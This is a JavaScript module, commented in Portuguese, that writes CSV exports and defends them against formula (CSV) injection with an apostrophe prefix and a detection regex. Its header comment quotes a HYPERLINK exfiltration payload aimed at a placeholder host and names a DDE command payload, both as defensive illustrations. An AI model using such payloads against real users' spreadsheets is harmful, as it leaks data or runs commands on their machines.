/**
 * ESCRITOR DE CSV — fonte única.
 *
 * Existe porque a exportação estava escrita dentro de `lib/relatorios-vendas.js`
 * e os relatórios de Estoque e Financeiro ainda não exportam nada. Quando eles
 * exportarem, a escolha é entre reusar isto ou escrever um segundo `celula()` —
 * e o segundo nasceria sem a neutralização de fórmula, porque essa parte não é
 * óbvia olhando o código do primeiro.
 *
 * O QUE ESTE ARQUIVO IMPEDE
 * -------------------------
 * INJEÇÃO DE FÓRMULA (CSV injection). O escape antigo cuidava de aspas,
 * separador e quebra de linha — tudo que o FORMATO exige — e não de quem ABRE o
 * arquivo. Excel e LibreOffice avaliam como fórmula qualquer célula que começa
 * com `=`, `+`, `-`, `@`, TAB ou CR. Medido em 25/09/2026, com um cliente
 * chamado `=1+1` e um produto chamado
 * `=HYPERLINK("http://exemplo.invalido/roubo?d="&A1,"Clique")`:
 *
 *     ...;V;=1+1;"=HYPERLINK(""http://exemplo.invalido/roubo?d=""&A1,""Clique"")";@SUM(A1:A9);...
 *
 * As quatro células saíram vivas. A segunda é a que importa: ela monta um link
 * com o CONTEÚDO DA PLANILHA na URL, e quem clica manda o dado para fora. Aspas
 * não protegem — o Excel avalia fórmula dentro de campo entre aspas também.
 *
 * E o caminho até lá é curto: o nome vem do cadastro, 6.492 pessoas entraram
 * por importação do ViperERP, e quem abre o arquivo é o dono ou o gerente, no
 * Windows, com Excel. Não precisa de invasão nenhuma — basta um cadastro com
 * nome esquisito.
 *
 * COMO SE NEUTRALIZA, E O PREÇO
 * -----------------------------
 * Prefixo `'` na célula suspeita, que é a recomendação de sempre para isto. O
 * preço é que o apóstrofo FICA VISÍVEL na importação de CSV (o truque de "aspas
 * simples marca texto" do Excel vale para digitação, não para importação). É
 * pouco: dado de negócio raramente começa com `=` ou `@`, e um apóstrofo
 * aparente é melhor do que uma fórmula que roda.
 *
 * O `-` ENTRA NA LISTA, apesar de ser o mais sujeito a falso positivo: `-2+3`
 * também é fórmula, e `-cmd|'/c ...'` é um dos payloads clássicos de DDE.
 * Proteger três dos quatro caracteres seria pior do que não proteger nenhum,
 * porque passaria a impressão de que o buraco está fechado. Coluna numérica não
 * passa por aqui (ver `numero` e `dinheiro` em quem chama), então valor negativo
 * não ganha apóstrofo.
 *
 * O RESTO DO FORMATO, e por que é assim:
 *   · separador `;` — é o que o Excel em português espera; com `,` a planilha
 *     abre tudo numa coluna só;
 *   · BOM UTF-8 no começo — sem ele o Excel lê os acentos como lixo;
 *   · CRLF — é o que a RFC 4180 manda, e o que o Excel do Windows espera.
 */

// `=`, `+`, `-`, `@` e, menos conhecidos, TAB e CR: os dois últimos porque o
// Excel os ignora antes de decidir se o que vem depois é fórmula.
const INICIO_DE_FORMULA = /^[=+\-@\t\r]/;

function texto(valor) {
  if (valor === undefined || valor === null) return '';
  return String(valor);
}

/**
 * Uma célula pronta para o arquivo: neutralizada e escapada, nesta ordem.
 *
 * A ordem importa. Escapar primeiro e prefixar depois colocaria o apóstrofo
 * FORA das aspas (`'"=..."`), que não é campo válido — o leitor veria o
 * apóstrofo como conteúdo e as aspas como começo de outro campo.
 */
function celula(valor) {
  let s = texto(valor);
  if (INICIO_DE_FORMULA.test(s)) s = `'${s}`;
  return /[;"\n\r]/.test(s) ? `"${s.replace(/"/g, '""')}"` : s;
}

/**
 * Junta células JÁ PRONTAS numa linha.
 *
 * Chama-se `juntar` e não `linha` de propósito: a primeira versão desta função
 * aplicava `celula` em cada valor, e quem chama já aplicava também — o texto
 * saía escapado duas vezes, e pior, o número formatado (`-10,00`) ganhava
 * apóstrofo e virava texto na planilha, zerando a soma da coluna.
 *
 * A regra, sem meio-termo: tudo que entra numa linha passou por `celula` (texto)
 * ou por `numero` (quantidade e dinheiro). Aqui só se coloca o ponto e vírgula.
 */
function juntar(celulas) {
  return (celulas || []).join(';');
}

/**
 * Um número no formato que o Excel em português entende: vírgula decimal.
 *
 * Sem passar por `celula`: número não é texto, não leva aspas e não pode ganhar
 * apóstrofo — com ele, a planilha trataria o valor como texto e a soma daria
 * zero. É por isso que quem chama separa as colunas por tipo.
 */
function numero(valor, casas) {
  const n = Number(valor);
  const seguro = Number.isFinite(n) ? n : 0;
  return (casas === undefined ? String(seguro) : seguro.toFixed(casas)).replace('.', ',');
}

/**
 * O arquivo inteiro. `linhas` são listas de células já prontas (ver `juntar`).
 *
 * Os `cabecalhos` são rótulos do NOSSO código, não dado de usuário — e mesmo
 * assim passam por `celula`: um rótulo com ponto e vírgula quebraria o arquivo
 * igual, e abrir exceção para "este aqui é seguro" é como a exceção vira regra.
 */
function documento(cabecalhos, linhas) {
  const corpo = (linhas || []).map(juntar);
  return '﻿' + [juntar((cabecalhos || []).map(celula)), ...corpo].join('\r\n') + '\r\n';
}

module.exports = { INICIO_DE_FORMULA, celula, juntar, numero, documento };
